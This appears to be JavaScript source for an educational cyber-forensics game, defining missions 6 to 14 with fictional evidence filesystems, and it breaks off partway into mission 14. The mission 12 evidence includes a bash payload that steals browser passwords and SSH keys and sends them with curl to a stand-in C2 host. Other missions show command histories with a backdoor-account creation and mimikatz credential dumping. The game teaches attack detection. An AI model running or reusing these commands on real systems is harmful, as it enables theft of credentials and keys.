// Chapter 1: Data Recovery & Forensics (Missions 6-15)

export const mission6 = {
  id: 'mission6', name: 'The Deleted File', level: 6, estimatedTime: 6,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nAgent, a whistleblower attempted to leak documents from MegaCorp. Before they could, someone deleted the evidence. Fortunately, our team recovered a disk image.\n\nYour task: Navigate the recovered filesystem, find the deleted report, and identify who ordered the deletion.\n\nTime limit: 10 minutes.\n\n— Handler Alpha`,
  objective: 'Find the deleted whistleblower report and identify the person who ordered its deletion',
  story: { intro: "A whistleblower's evidence was wiped. Find it in the recovered disk image.", completion: "Great work. The deleted report reveals a massive fraud operation. We now know who tried to cover it up." },
  filesystem: {
    'recovered_disk': {
      'documents': {
        'quarterly_report.txt': 'MegaCorp Q1 2024\nRevenue: $4.2B\nExpenses: $3.8B\nProfit: $400M\nAll figures approved by CFO.',
        'meeting_notes.txt': 'Board Meeting — March 15\nAttendees: CEO, CFO, CTO\nTopic: Q1 projections\nAction: CFO to "adjust" figures before audit.',
        'employee_list.txt': 'MegaCorp Employees:\n- Sarah Chen (CEO)\n- Marcus Webb (CFO)\n- Diana Torres (CTO)\n- James Liu (Analyst)\n- Priya Sharma (Auditor)'
      },
      'trash': {
        '.deleted_report.txt': '=== WHISTLEBLOWER REPORT ===\nFiled by: Priya Sharma (Auditor)\nDate: March 20, 2024\n\nFindings:\n- CFO Marcus Webb has been falsifying quarterly reports\n- Actual losses of $200M hidden as "restructuring costs"\n- CEO Sarah Chen authorized the cover-up\n- Evidence found in email server backup\n\nDeletion ordered by: Marcus Webb\nDeletion timestamp: March 21, 2024 02:15 AM',
        'readme.txt': 'TRASH DIRECTORY\nFiles here were marked for deletion.\nSome may be recoverable.'
      },
      'logs': {
        'deletion_log.txt': 'DELETION LOG:\n2024-03-21 02:15:00 — User: m.webb — Deleted: whistleblower_report.pdf\n2024-03-21 02:15:30 — User: m.webb — Deleted: audit_evidence.zip\n2024-03-21 02:16:00 — User: m.webb — Cleared: email_backup/',
        'access_log.txt': 'ACCESS LOG:\n2024-03-20 18:00 — p.sharma accessed audit files\n2024-03-20 23:45 — m.webb logged in (unusual hours)\n2024-03-21 02:14 — m.webb escalated privileges\n2024-03-21 02:15 — m.webb deleted multiple files\n2024-03-21 02:20 — m.webb logged out'
      },
      'emails': {
        'inbox.txt': 'From: s.chen@megacorp.com\nTo: m.webb@megacorp.com\nSubject: RE: The auditor problem\n\nMarcus,\nHandle it. Make sure nothing traces back to us.\n— Sarah',
        'sent.txt': 'From: m.webb@megacorp.com\nTo: s.chen@megacorp.com\nSubject: Done\n\nSarah,\nThe files have been deleted. The auditor has been reassigned.\n— Marcus'
      }
    }
  },
  initialPath: '/recovered_disk',
  hints: [
    "Check the trash directory — deleted files often end up there.",
    "Hidden files start with a dot (.). Try 'ls -la' in the trash folder.",
    "The deleted report is at /recovered_disk/trash/.deleted_report.txt"
  ],
  progressKeys: ['foundReport', 'identifiedCulprit'],
  successCondition: (p) => p.foundReport && p.identifiedCulprit,
  triggers: [
    { command: 'cat', args: ['.deleted_report.txt'], check: (s) => s.currentPath.includes('trash'), progressUpdate: { foundReport: true } },
    { command: 'cat', args: ['deletion_log.txt'], check: (s) => s.currentPath.includes('logs'), progressUpdate: { identifiedCulprit: true }, narrative: '🔍 The deletion log confirms it was Marcus Webb. Combined with the report, we have iron-clad evidence.' }
  ]
};

export const mission7 = {
  id: 'mission7', name: 'Memory Forensics', level: 7, estimatedTime: 8,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nAgent, we've captured a memory dump from a compromised workstation. The attacker left traces in RAM that reveal their method of entry.\n\nAnalyze the memory dump files, find the malicious process, and trace the attacker's IP.\n\nTime limit: 10 minutes.\n\n— Handler Bravo`,
  objective: 'Analyze the memory dump to find the malicious process and attacker IP',
  story: { intro: "A workstation was compromised. The memory dump holds the answers.", completion: "Excellent forensic work. The malicious process 'svchost_fake.exe' was injecting code. We've traced the attacker to 203.0.113.42." },
  filesystem: {
    'memdump': {
      'processes': {
        'process_list.txt': 'PID    PROCESS            CPU    MEM    STATUS\n1001   explorer.exe       2.1%   45MB   Normal\n1002   chrome.exe         8.4%   320MB  Normal\n1003   svchost.exe        0.3%   12MB   Normal\n1004   svchost_fake.exe   15.7%  89MB   SUSPICIOUS\n1005   notepad.exe        0.1%   8MB    Normal\n1006   outlook.exe        3.2%   120MB  Normal\n1007   cmd.exe            0.0%   4MB    Hidden',
        'svchost_fake_details.txt': 'Process: svchost_fake.exe (PID 1004)\nPath: C:\\Windows\\Temp\\svchost_fake.exe\nParent: cmd.exe (PID 1007)\nStart Time: 2024-04-14 03:22:15\nConnections:\n  - 203.0.113.42:4444 (ESTABLISHED)\n  - 10.0.0.1:445 (LISTENING)\nInjected DLLs:\n  - payload.dll\n  - keylogger.dll\nDescription: MALICIOUS — Masquerading as legitimate svchost',
        'cmd_details.txt': 'Process: cmd.exe (PID 1007)\nPath: C:\\Windows\\System32\\cmd.exe\nParent: outlook.exe (PID 1006)\nStart Time: 2024-04-14 03:22:00\nCommand History:\n  > powershell -enc [BASE64_PAYLOAD]\n  > net user backdoor Pass123 /add\n  > reg add HKLM\\...\\Run /v persist'
      },
      'network': {
        'connections.txt': 'Active Network Connections:\nProto  Local Address      Remote Address     State\nTCP    10.0.0.5:49152    203.0.113.42:4444  ESTABLISHED\nTCP    10.0.0.5:49153    8.8.8.8:443        ESTABLISHED\nTCP    10.0.0.5:445      10.0.0.1:49200     LISTENING\nUDP    10.0.0.5:53       8.8.8.8:53         --',
        'dns_cache.txt': 'DNS Cache:\nattacker-c2.evil.com -> 203.0.113.42\ngoogle.com -> 142.250.80.46\nmicrosoft.com -> 20.70.246.20\nupdate-server.evil.com -> 203.0.113.42'
      },
      'registry': {
        'persistence.txt': 'Registry Persistence Keys:\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n  "WindowsUpdate" = "C:\\Windows\\Temp\\svchost_fake.exe"\n  "SystemService" = "C:\\Windows\\Temp\\persist.bat"\n\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n  "OneDriveSync" = "C:\\Users\\victim\\AppData\\keylog.exe"'
      },
      'strings': {
        'extracted_strings.txt': 'Strings extracted from svchost_fake.exe:\n...\nhttp://203.0.113.42/exfil\nC:\\Users\\victim\\Documents\\*\npassword\ncredentials\nbitcoin\nwallet.dat\n...\nVersion: MalRAT v3.1\nAuthor: ghost_spider\nC2: attacker-c2.evil.com'
      }
    }
  },
  initialPath: '/memdump',
  hints: [
    "Start by looking at the process list. One process has an unusual name and high resource usage.",
    "Check the details of the suspicious process — it has network connections to an external IP.",
    "Analyze the connections.txt file to confirm the attacker's IP address."
  ],
  progressKeys: ['foundMaliciousProcess', 'tracedAttackerIP'],
  successCondition: (p) => p.foundMaliciousProcess && p.tracedAttackerIP,
  triggers: [
    { command: 'cat', args: ['svchost_fake_details.txt'], progressUpdate: { foundMaliciousProcess: true }, narrative: '🔬 Found it! svchost_fake.exe is the malicious process. It\'s connecting to 203.0.113.42...' },
    { command: 'cat', args: ['connections.txt'], check: (s) => s.currentPath.includes('network'), progressUpdate: { tracedAttackerIP: true } },
    { command: 'analyze', args: ['connections.txt'], check: (s) => s.currentPath.includes('network'), progressUpdate: { tracedAttackerIP: true } }
  ]
};

export const mission8 = {
  id: 'mission8', name: 'The Corrupted Database', level: 8, estimatedTime: 7,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nA hospital database was hit by ransomware. We've recovered fragments of patient records. One patient — "Patient Zero" — holds the key to tracing the ransomware source.\n\nSearch through the recovered database fragments and find Patient Zero's record.\n\n— Handler Alpha`,
  objective: 'Find Patient Zero\'s record in the corrupted database fragments',
  story: { intro: "Hospital records encrypted by ransomware. Find Patient Zero in the fragments.", completion: "Patient Zero identified: Dr. Alan Reeves. He unknowingly downloaded the ransomware through a phishing email." },
  filesystem: {
    'db_recovery': {
      'fragment_01': {
        'records_a.txt': 'PATIENT RECORDS (Fragment A)\nID: 10042 | Name: Alice Morgan | DOB: 1985-03-12 | Status: Discharged\nID: 10043 | Name: Bob Franklin | DOB: 1970-08-22 | Status: Active\nID: 10044 | Name: Carol Yates | DOB: 1992-01-05 | Status: Active',
        'records_b.txt': 'PATIENT RECORDS (Fragment B)\nID: 10045 | Name: David Kim | DOB: 1988-11-30 | Status: Discharged\nID: 10046 | Name: Eva Santos | DOB: 1995-06-18 | Status: Active'
      },
      'fragment_02': {
        'records_c.txt': 'PATIENT RECORDS (Fragment C)\nID: 10047 | Name: Frank O\'Brien | DOB: 1967-04-09 | Status: Deceased\nID: 10048 | Name: Grace Liu | DOB: 2001-09-14 | Status: Active',
        'records_d.txt': 'PATIENT RECORDS (Fragment D) [CORRUPTED]\nID: 10049 | N███: ██████ | DOB: ████████ | Status: ███████\nID: 10050 | Name: Hassan Ali | DOB: 1979-12-01 | Status: Active'
      },
      'fragment_03': {
        '.patient_zero.txt': 'PATIENT ZERO RECORD [RECOVERED]\n================================\nID: 00001\nName: Dr. Alan Reeves\nRole: Chief of Staff\nDOB: 1975-07-20\nStatus: COMPROMISED\n\nIncident Notes:\n- Dr. Reeves opened phishing email on April 10, 2024\n- Email contained "urgent_patient_records.exe"\n- Ransomware deployed from his workstation\n- All connected systems encrypted within 4 hours\n- Ransom demand: 50 BTC\n\nSource IP of phishing server: 198.51.100.77',
        'admin_notes.txt': 'ADMIN NOTES:\nThe ransomware entered through a staff member\'s workstation.\nLook for Patient Zero — the first infected system.\nTheir record was hidden to prevent tampering.'
      },
      'ransom_note.txt': 'YOUR FILES HAVE BEEN ENCRYPTED\n================================\nAll patient records, financial data, and\noperational files are now locked.\n\nTo recover your data, send 50 BTC to:\nbc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\nYou have 72 hours.\n\n— DarkCrypt Team'
    }
  },
  initialPath: '/db_recovery',
  hints: [
    "Patient Zero's record was hidden. Check all fragments carefully.",
    "Hidden files start with a dot. Use 'ls -la' in each fragment directory.",
    "Fragment 03 contains a hidden file: .patient_zero.txt"
  ],
  progressKeys: ['foundPatientZero'],
  successCondition: (p) => p.foundPatientZero === true,
  triggers: [
    { command: 'cat', args: ['.patient_zero.txt'], progressUpdate: { foundPatientZero: true }, narrative: '🏥 Patient Zero found: Dr. Alan Reeves. The ransomware entered through his phishing email. We can now trace the attack chain.' }
  ]
};

export const mission9 = {
  id: 'mission9', name: 'Timestamp Trail', level: 9, estimatedTime: 8,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nAgent, a suspect claims they were at home during a cyber attack. We need to prove otherwise by analyzing their device logs.\n\nFind evidence in the timestamps that contradicts their alibi. The attack occurred between 2:00 AM and 4:00 AM on April 12.\n\n— Handler Bravo`,
  objective: 'Find timestamped evidence that contradicts the suspect\'s alibi',
  story: { intro: "The suspect says they were home. The device logs say otherwise.", completion: "The GPS data, WiFi logs, and browser history all place the suspect at the victim's office during the attack window." },
  filesystem: {
    'device_forensics': {
      'phone_data': {
        'gps_log.txt': 'GPS Location History:\n2024-04-11 22:00 — 40.7128° N, 74.0060° W (Home)\n2024-04-11 23:30 — 40.7128° N, 74.0060° W (Home)\n2024-04-12 01:15 — 40.7128° N, 74.0060° W (Home)\n2024-04-12 01:45 — 40.7282° N, 73.9942° W (Moving)\n2024-04-12 02:10 — 40.7580° N, 73.9855° W (Victim Office)\n2024-04-12 02:15 — 40.7580° N, 73.9855° W (Victim Office)\n2024-04-12 03:45 — 40.7580° N, 73.9855° W (Victim Office)\n2024-04-12 04:20 — 40.7282° N, 73.9942° W (Moving)\n2024-04-12 05:00 — 40.7128° N, 74.0060° W (Home)',
        'wifi_connections.txt': 'WiFi Connection Log:\n2024-04-11 22:00 — Connected: HomeWiFi-5G\n2024-04-12 01:50 — Disconnected: HomeWiFi-5G\n2024-04-12 02:12 — Connected: VictimCorp-Guest\n2024-04-12 03:48 — Disconnected: VictimCorp-Guest\n2024-04-12 05:02 — Connected: HomeWiFi-5G'
      },
      'laptop_data': {
        'browser_history.txt': 'Browser History:\n2024-04-11 21:00 — netflix.com (watched movie)\n2024-04-11 23:00 — reddit.com/r/hacking\n2024-04-12 02:20 — 192.168.1.100/admin (Internal IP - Victim Network)\n2024-04-12 02:35 — github.com/exploit-tools/mimikatz\n2024-04-12 03:10 — 192.168.1.100/database/export\n2024-04-12 03:30 — mega.nz/upload (File upload service)',
        'command_history.txt': 'Terminal History:\n$ ssh admin@192.168.1.100\n$ whoami\n$ net user\n$ mimikatz.exe\n$ sekurlsa::logonpasswords\n$ copy \\\\192.168.1.100\\share\\* C:\\exfil\\\n$ exit'
      },
      'alibi_statement.txt': 'SUSPECT STATEMENT:\n"I was at home all night on April 11-12.\nI went to bed around 11 PM and woke up at 7 AM.\nI did not leave my apartment.\nI was not near the victim\'s office."'
    }
  },
  initialPath: '/device_forensics',
  hints: [
    "Compare the alibi statement to the actual GPS and WiFi logs.",
    "The GPS log shows movement to 'Victim Office' during the attack window.",
    "The WiFi log shows connection to 'VictimCorp-Guest' — directly contradicting the alibi."
  ],
  progressKeys: ['foundGPSEvidence', 'foundWiFiEvidence'],
  successCondition: (p) => p.foundGPSEvidence && p.foundWiFiEvidence,
  triggers: [
    { command: 'cat', args: ['gps_log.txt'], progressUpdate: { foundGPSEvidence: true }, narrative: '📍 GPS data shows the suspect was at the victim\'s office from 2:10 AM to 3:45 AM. Their alibi is false!' },
    { command: 'cat', args: ['wifi_connections.txt'], progressUpdate: { foundWiFiEvidence: true }, narrative: '📶 WiFi records confirm connection to VictimCorp-Guest network. Evidence is conclusive.' },
    { command: 'grep', args: ['VictimCorp', 'wifi_connections.txt'], progressUpdate: { foundWiFiEvidence: true } }
  ]
};

export const mission10 = {
  id: 'mission10', name: 'The Insider Threat', level: 10, estimatedTime: 8,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nAgent, a major government contractor suspects a data leak. Classified documents are appearing on foreign intelligence servers. One of five employees with top-secret clearance is the mole.\n\nAnalyze access logs, email patterns, and financial records to identify the insider.\n\n— Handler Alpha`,
  objective: 'Identify which employee is the insider threat leaking classified documents',
  story: { intro: "One of five cleared employees is selling secrets. Find the mole.", completion: "It's Employee #3 — Dr. Rachel Fox. Offshore accounts, encrypted emails to foreign contacts, and after-hours access all point to her." },
  filesystem: {
    'investigation': {
      'personnel': {
        'employee_1.txt': 'James Morton — Senior Analyst\nClearance: TS/SCI\nYears: 12\nPerformance: Excellent\nFinancial Check: Clean — No unusual spending\nTravel: Domestic only, family vacations\nFlags: None',
        'employee_2.txt': 'Linda Park — Lead Engineer\nClearance: TS/SCI\nYears: 8\nPerformance: Outstanding\nFinancial Check: Clean — Mortgage, car loan\nTravel: Conference in Berlin (approved)\nFlags: None',
        'employee_3.txt': 'Dr. Rachel Fox — Research Director\nClearance: TS/SCI\nYears: 5\nPerformance: Good\nFinancial Check: ⚠️ FLAGGED\n  - Unexplained deposits: $50K, $75K, $60K\n  - Offshore account detected (Cayman Islands)\nTravel: Multiple trips to Vienna (personal)\nFlags: UNDER REVIEW',
        'employee_4.txt': 'Marcus Bell — Systems Admin\nClearance: TS/SCI\nYears: 15\nPerformance: Satisfactory\nFinancial Check: Clean — Consistent salary\nTravel: None in past 2 years\nFlags: None',
        'employee_5.txt': 'Sarah Nguyen — Program Manager\nClearance: TS/SCI\nYears: 10\nPerformance: Excellent\nFinancial Check: Clean — Normal spending\nTravel: Washington DC (work-related)\nFlags: None'
      },
      'access_logs': {
        'server_access.txt': 'Classified Server Access Log:\n2024-04-01 09:00 — J.Morton — Project_Eagle.pdf — VIEW\n2024-04-01 14:30 — L.Park — Specs_v3.docx — VIEW\n2024-04-02 22:45 — R.Fox — Project_Eagle.pdf — DOWNLOAD ⚠️\n2024-04-03 23:10 — R.Fox — Budget_Classified.xlsx — DOWNLOAD ⚠️\n2024-04-05 02:15 — R.Fox — Agent_List_2024.pdf — DOWNLOAD ⚠️\n2024-04-05 09:00 — M.Bell — System_Config.txt — VIEW\n2024-04-06 10:30 — S.Nguyen — Schedule_Q2.pdf — VIEW\n2024-04-07 01:30 — R.Fox — Satellite_Codes.pdf — DOWNLOAD ⚠️',
        'vpn_log.txt': 'VPN Connection Log:\nAll employees use VPN from approved devices.\n⚠️ Exception: R.Fox connected from unregistered device on 4/2, 4/3, 4/5, 4/7\nDevice fingerprint: Unknown Android device\nIP trace: Routed through Tor exit nodes'
      },
      'emails': {
        'flagged_emails.txt': 'Flagged Email Activity:\n\nR.Fox → unknown@protonmail.com (encrypted)\n  Subject: "Package ready"\n  Sent: 2024-04-02 23:00\n\nR.Fox → unknown@protonmail.com (encrypted)\n  Subject: "Next delivery"\n  Sent: 2024-04-05 02:30\n\nR.Fox → travel@agency.com\n  Subject: "Vienna trip — personal leave"\n  Sent: 2024-04-06 08:00\n\nNo other employees have flagged communications.'
      }
    }
  },
  initialPath: '/investigation',
  hints: [
    "Check the financial records of each employee in the personnel folder.",
    "One employee has unexplained large deposits and an offshore account.",
    "Cross-reference with the server access logs — who is downloading classified files at odd hours?"
  ],
  progressKeys: ['foundFinancialFlag', 'confirmedAccessPattern'],
  successCondition: (p) => p.foundFinancialFlag && p.confirmedAccessPattern,
  triggers: [
    { command: 'cat', args: ['employee_3.txt'], progressUpdate: { foundFinancialFlag: true }, narrative: '💰 Dr. Rachel Fox has unexplained deposits totaling $185K and a Cayman Islands offshore account. Very suspicious...' },
    { command: 'cat', args: ['server_access.txt'], progressUpdate: { confirmedAccessPattern: true }, narrative: '🚨 R. Fox downloaded 4 classified documents at unusual hours (10PM-2AM). She\'s the mole!' }
  ]
};

export const mission11 = {
  id: 'mission11', name: 'Email Header Analysis', level: 11, estimatedTime: 7,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nAgent, a CEO received a phishing email that led to a $2M wire transfer. We need to trace the email back to its true origin.\n\nAnalyze the email headers, find the real sender, and identify the attacker's infrastructure.\n\n— Handler Bravo`,
  objective: 'Trace the phishing email to its true origin by analyzing headers',
  story: { intro: "A CEO was phished for $2M. Trace the email back to the attackers.", completion: "The email originated from 185.220.101.45 in Eastern Europe, spoofing the CFO's address. The attacker used mail.shadowphish.net." },
  filesystem: {
    'email_analysis': {
      'phishing_email.txt': 'From: cfo@company.com (SPOOFED)\nTo: ceo@company.com\nSubject: URGENT - Wire Transfer Needed\nDate: Thu, 11 Apr 2024 09:15:00 -0400\n\nHi,\n\nI need you to authorize an immediate wire transfer of $2,000,000 to our new vendor.\n\nAccount: 847291038\nRouting: 021000021\nBank: International Trust Bank, Cyprus\n\nThis is time-sensitive. Please process today.\n\nRegards,\nDavid Chen, CFO',
      'email_headers.txt': 'Return-Path: <bounce@mail.shadowphish.net>\nReceived: from mail.company.com (10.0.0.5)\n  by mx.company.com with ESMTPS id abc123\n  for <ceo@company.com>;\n  Thu, 11 Apr 2024 09:15:02 -0400\nReceived: from mail.shadowphish.net (185.220.101.45)\n  by mail.company.com (10.0.0.5)\n  with SMTP id xyz789;\n  Thu, 11 Apr 2024 09:14:58 -0400\nReceived: from localhost (127.0.0.1)\n  by mail.shadowphish.net (185.220.101.45)\n  with ESMTP;\n  Thu, 11 Apr 2024 16:14:55 +0300\nX-Mailer: PhishKit v4.2\nX-Originating-IP: 185.220.101.45\nAuthentication-Results: company.com;\n  spf=fail (sender IP 185.220.101.45 not authorized for company.com)\n  dkim=none\n  dmarc=fail',
      'spf_check.txt': 'SPF Record for company.com:\nv=spf1 ip4:10.0.0.0/8 ip4:203.0.113.10 -all\n\nSender IP: 185.220.101.45\nResult: FAIL — IP not authorized to send for company.com\n\nNote: SPF failure should have been caught by email gateway.\nEmail gateway was misconfigured to soft-fail instead of reject.',
      'ip_lookup.txt': 'IP: 185.220.101.45\nLocation: Eastern Europe\nASN: AS12345 — ShadowHost LLC\nReverse DNS: mail.shadowphish.net\nReputation: BLACKLISTED on 12 threat feeds\n\nAssociated domains:\n  - shadowphish[.]net\n  - phishkit[.]evil\n  - fake-bank-login[.]com\n\nHistory: Known phishing infrastructure since 2023',
      'real_cfo_email.txt': 'From: cfo@company.com (VERIFIED)\nTo: ceo@company.com\nSubject: Re: Wire Transfer\nDate: Thu, 11 Apr 2024 11:00:00 -0400\n\nI did NOT send that email. I was in a meeting all morning.\nPlease alert IT security immediately.\n\n— David Chen, CFO (actual)'
    }
  },
  initialPath: '/email_analysis',
  hints: [
    "Start by reading the email headers — they show the actual path the email took.",
    "Look for the X-Originating-IP and the Return-Path. These reveal the true sender.",
    "The IP lookup file confirms the attacker's infrastructure details."
  ],
  progressKeys: ['foundSpoofedOrigin', 'tracedAttacker'],
  successCondition: (p) => p.foundSpoofedOrigin && p.tracedAttacker,
  triggers: [
    { command: 'cat', args: ['email_headers.txt'], progressUpdate: { foundSpoofedOrigin: true }, narrative: '📧 Headers reveal the email came from mail.shadowphish.net (185.220.101.45), NOT from the real CFO!' },
    { command: 'cat', args: ['ip_lookup.txt'], progressUpdate: { tracedAttacker: true }, narrative: '🌐 IP traced to ShadowHost LLC in Eastern Europe. Known phishing infrastructure. Case documented.' }
  ]
};

export const mission12 = {
  id: 'mission12', name: 'The USB Drop', level: 12, estimatedTime: 7,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nAgent, a USB drive was found in the parking lot of a defense contractor. Someone plugged it in (bad idea). We've imaged the drive and need to determine:\n\n1. What the USB was designed to do\n2. What data it may have stolen\n\nAnalyze the USB image carefully.\n\n— Handler Alpha`,
  objective: 'Analyze the USB image to determine its purpose and what data it targeted',
  story: { intro: "Someone plugged in a suspicious USB. Analyze the image to understand the attack.", completion: "The USB contained a rubber ducky payload that exfiltrated browser passwords and SSH keys to a remote server." },
  filesystem: {
    'usb_image': {
      '.autorun': {
        'payload.txt': '#!/bin/bash\n# USB Rubber Ducky Payload\n# Executes on plug-in via HID emulation\n\n# Stage 1: Exfiltrate browser passwords\ncp ~/.config/chrome/Login\\ Data /tmp/.exfil/\ncp ~/.mozilla/firefox/*.default/logins.json /tmp/.exfil/\n\n# Stage 2: Steal SSH keys\ncp ~/.ssh/id_rsa /tmp/.exfil/\ncp ~/.ssh/id_rsa.pub /tmp/.exfil/\ncp ~/.ssh/known_hosts /tmp/.exfil/\n\n# Stage 3: Exfiltrate to C2\ncurl -X POST http://198.51.100.99/collect \\\n  -F "data=@/tmp/.exfil/data.tar.gz"\n\n# Stage 4: Clean up\nrm -rf /tmp/.exfil/',
        'config.txt': 'RUBBER DUCKY CONFIG\nType: HID Attack\nDelay: 500ms\nTarget OS: Linux/macOS\nC2 Server: 198.51.100.99\nExfil Method: HTTP POST\nCleanup: Enabled\nPersistence: None (smash and grab)'
      },
      'decoy_files': {
        'vacation_photos.txt': '[This folder appears to contain vacation photos]\n[Actually empty — used as bait to encourage plugging in the USB]',
        'resume.txt': 'John Smith\nSoftware Engineer\n[Fake resume used as social engineering lure]'
      },
      'logs': {
        'execution_log.txt': 'USB EXECUTION LOG:\n2024-04-10 14:32:00 — USB inserted\n2024-04-10 14:32:01 — HID device registered\n2024-04-10 14:32:02 — Payload executing...\n2024-04-10 14:32:05 — Chrome Login Data: COPIED\n2024-04-10 14:32:06 — Firefox logins: NOT FOUND\n2024-04-10 14:32:07 — SSH key id_rsa: COPIED\n2024-04-10 14:32:08 — SSH known_hosts: COPIED\n2024-04-10 14:32:10 — Exfil to 198.51.100.99: SUCCESS (245KB)\n2024-04-10 14:32:11 — Cleanup: COMPLETE\n2024-04-10 14:32:12 — Total execution time: 12 seconds'
      }
    }
  },
  initialPath: '/usb_image',
  hints: [
    "The real payload is hidden. Check for hidden directories with 'ls -la'.",
    "The .autorun directory contains the attack payload and configuration.",
    "Check the execution log to see what data was actually stolen."
  ],
  progressKeys: ['foundPayload', 'foundExfilLog'],
  successCondition: (p) => p.foundPayload && p.foundExfilLog,
  triggers: [
    { command: 'cat', args: ['payload.txt'], check: (s) => s.currentPath.includes('.autorun'), progressUpdate: { foundPayload: true }, narrative: '💽 Rubber Ducky payload found! It steals browser passwords and SSH keys, then exfiltrates to 198.51.100.99.' },
    { command: 'cat', args: ['execution_log.txt'], progressUpdate: { foundExfilLog: true }, narrative: '📊 Execution log shows Chrome passwords and SSH keys were successfully exfiltrated in just 12 seconds.' }
  ]
};

export const mission13 = {
  id: 'mission13', name: 'Steganography', level: 13, estimatedTime: 9,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'decode', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nAgent, we intercepted communications from a spy ring. They're hiding messages inside innocent-looking files using steganography — the art of hiding data within other data.\n\nAnalyze the intercepted files and extract the hidden messages.\n\n— Handler Bravo`,
  objective: 'Extract 3 hidden messages concealed within ordinary-looking files',
  story: { intro: "A spy ring is using steganography. Find the hidden messages in their files.", completion: "All three hidden messages extracted. The spy ring is planning a meeting at the Zurich train station, platform 7, at midnight." },
  filesystem: {
    'intercepted': {
      'file_1': {
        'shopping_list.txt': 'SHOPPING LIST\n=============\nMilk — 2 gallons\nEggs — 1 dozen\nBread — whole wheat\nApples — 6\nChicken breast — 2 lbs\nRice — 5 lbs\nTomatoes — 4\nOnions — 3\nGarlic — 1 head\nOlive oil — extra virgin',
        'shopping_list_metadata.txt': 'File: shopping_list.txt\nCreated: 2024-04-08 15:30\nModified: 2024-04-08 15:30\nSize: 203 bytes (REPORTED)\nActual Size: 458 bytes ⚠️ SIZE MISMATCH\n\nNote: File reports 203 bytes but occupies 458 bytes on disk.\nHidden data likely appended after visible content.',
        'hidden_message_1.txt': '[EXTRACTED FROM: shopping_list.txt — bytes 204-458]\n\n===HIDDEN===\nMeeting confirmed.\nLocation: Zurich Hauptbahnhof\nPlatform: 7\nTime: 0000 hours\nContact: RAVEN\n===END==='
      },
      'file_2': {
        'poem.txt': 'The Wanderer\n\nThrough misty valleys I did roam,\nHoping to find my way back home.\nEvery path seemed dark and strange,\nMaking me feel out of range.\nEvening fell with stars so bright,\nEnding my journey through the night.\nTaking shelter under oak,\nImagining the words she spoke.\nNothing left but morning dew,\nGently waking, starting new.',
        'poem_analysis.txt': 'ANALYSIS: poem.txt\n\nAcrostic detected! Read the first letter of each line:\nT-H-E-M-E-E-T-I-N-G\n\nHidden message: "THE MEETING"\n\nThis is an acrostic cipher — a classic steganographic technique.',
      },
      'file_3': {
        'coordinates.txt': 'ENCODED COORDINATES\n\n48 65 78 3a 20 34 37 2e 33 37 36 39 38 37 2c 20 38 2e 35 34 31 36 39 34\n\nNote: These appear to be hex-encoded ASCII characters.',
      }
    }
  },
  initialPath: '/intercepted',
  hints: [
    "Each file directory contains clues. Start with file_1 and look at the metadata.",
    "In file_2, read the poem carefully — or check the analysis file for a hidden pattern.",
    "The coordinates in file_3 are hex-encoded. Use 'decode coordinates.txt hex' to reveal them."
  ],
  progressKeys: ['decoded1', 'decoded2', 'decoded3'],
  successCondition: (p) => p.decoded1 && p.decoded2 && p.decoded3,
  decodeDatabase: { 'coordinates.txt': { hex: 'Decoded coordinates: 47.376987, 8.541694\n\nLocation: Zürich Hauptbahnhof (Zurich Main Train Station)\nThis matches the meeting location from Message 1!' } },
  triggers: [
    { command: 'cat', args: ['hidden_message_1.txt'], progressUpdate: { decoded1: true }, narrative: '🔍 Message 1: Meeting at Zurich train station, Platform 7, midnight. Contact: RAVEN.' },
    { command: 'cat', args: ['poem_analysis.txt'], progressUpdate: { decoded2: true }, narrative: '📝 Message 2: Acrostic cipher spells "THE MEETING" — confirms the rendezvous.' },
    { command: 'decode', args: ['coordinates.txt', 'hex'], progressUpdate: { decoded3: true }, narrative: '🗺️ Message 3: Coordinates point to Zurich Hauptbahnhof! All messages decoded.' }
  ]
};

export const mission14 = {
  id: 'mission14', name: 'Log Tampering', level: 14, estimatedTime: 8,
  unlockedCommands: ['ls', 'cd', 'cat', 'grep', 'analyze', 'help', 'clear', 'pwd', 'hint', 'status'],
  briefing: `[SECURE MESSAGE FROM HANDLER]\n\nAgent, someone broke into a bank's systems and then tampered with the logs to cover their tracks. We have both the original backup logs and the tampered logs.\n\nCompare them to find what was changed, and determine what the attacker was really doing.\n\n— Handler Alpha`,
  objective: 'Compare original and tampered logs to find the attacker\'s real activity',
  story: { intro: "The attacker tampered with logs. Compare originals to find the truth.", completion: "The attacker deleted 3 critical log entries covering a $5M unauthorized transfer and the creation of a backdoor admin account." },
  filesystem: {
    'log_analysis': {
      'original_backup': {
